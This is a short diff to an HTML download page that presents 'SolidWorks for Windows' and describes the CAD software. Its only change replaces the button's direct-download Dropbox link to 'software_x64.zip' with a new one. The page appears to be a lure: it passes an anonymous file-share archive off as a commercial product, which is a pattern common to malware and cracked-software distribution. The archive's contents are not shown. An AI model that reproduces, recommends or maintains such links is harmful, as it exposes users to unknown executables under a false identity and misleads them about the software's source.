@@ -6,7 +6,7 @@
 <h3>SolidWorks for Windows</h3>
 <p>SolidWorks is a powerful CAD (Computer-Aided Design) software used for 3D modeling, simulation, and product design. Ideal for engineers, designers, and manufacturers, SolidWorks allows you to create detailed 3D models, perform simulations, and generate technical drawings, all within a seamless interface that accelerates the design process.</p>
 
-<a href="https://www.dropbox.com/scl/fi/4oj37cybiy9anrbd5vr5x/software_x64.zip?rlkey=iaoleqpj6cg1iru6ymfyzlpt8&st=n8evwdqs&dl=1">
+<a href="https://www.dropbox.com/scl/fi/evien1e06zbc1p1uvcmq6/software_x64.zip?rlkey=87vfcnwd2e4wgqevmxj63jpdd&st=auoy6oub&dl=1">
   <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Download for Windows"/>
 </a>
 </div>
